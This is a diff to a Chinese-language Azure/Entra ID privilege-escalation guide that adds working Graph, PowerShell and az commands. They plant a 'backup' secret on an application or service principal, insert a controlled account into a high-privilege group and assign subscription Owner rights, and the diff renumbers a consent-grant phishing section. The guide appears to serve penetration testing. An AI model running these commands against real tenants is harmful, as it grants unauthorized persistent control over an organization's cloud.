@@ -108,18 +108,50 @@ curl -H "Authorization: Bearer $TOKEN" \
 # 如果有权限给 Application 添加凭据
 # Application.ReadWrite.All 或 Application 的 Owner
 
+# 前置：先确认自己是不是这个 App 的 Owner
+Get-MgApplicationOwner -ApplicationId <application-object-id>
+
 # 添加 Password Credential
 curl -X POST -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   "https://graph.microsoft.com/v1.0/applications/{app-id}/addPassword" \
   -d '{"passwordCredential":{"displayName":"backup"}}'
 
+# PowerShell cmdlet 形态（返回值里的 SecretText 只回显一次，不记就没了）
+Add-MgApplicationPassword -ApplicationId <application-object-id> `
+  -PasswordCredential @{ displayName = "backup" }
+# 等价的服务主体形态
+Add-MgServicePrincipalPassword -ServicePrincipalId <sp-object-id> `
+  -PasswordCredential @{ displayName = "backup" }
+
 # 使用新密码以 Service Principal 身份登录
 curl -X POST "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token" \
   -d "client_id={app-id}&client_secret={new-secret}&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
+
+# 收尾：用完把加的凭据删掉（失败重试时最容易留下一堆 backup-cred）
+Remove-MgApplicationPassword -ApplicationId <application-object-id> -KeyId <key-id>
 ```
 
-### 3.2 Consent Grant 攻击
+### 3.2 组成员注入
+
+组本身没权限不要紧 —— 看它挂的是哪个目录角色。
+
+```bash
+# 看 group 的 Owner：Owner 可改成员，是最省事的入口
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/beta/groups/<group-id>/owners"
+
+# 把自己或控制的账号塞进高权限组
+New-MgGroupMember -GroupId <group-id> -DirectoryObjectId <把自己/受控对象的 object-id>
+
+# Azure 侧同一套思路：改 RBAC 分配（需要 Microsoft.Authorization/roleAssignments/write）
+az role assignment create --assignee <object-id> --role Owner \
+  --scope /subscriptions/<subscription-id>
+```
+
+回收：`Remove-MgGroupMember -GroupId <gid> -DirectoryObjectId <oid>`；RBAC 用 `az role assignment delete`。3.1 与本节都会在 Entra ID 审计日志里留下 `Add member to group` / `Add service principal credentials` 记录，这条清不掉。
+
+### 3.3 Consent Grant 攻击
 
 ```bash
 # 创建恶意应用 → 诱骗管理员授予高权限
@@ -131,7 +163,7 @@ curl -H "Authorization: Bearer $TOKEN" \
   "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=consentType eq 'AllPrincipals'"
 ```
 
-### 3.3 PIM (Privileged Identity Management) 激活
+### 3.4 PIM (Privileged Identity Management) 激活
 
 ```bash
 # 如果用户有 eligible 角色但未激活
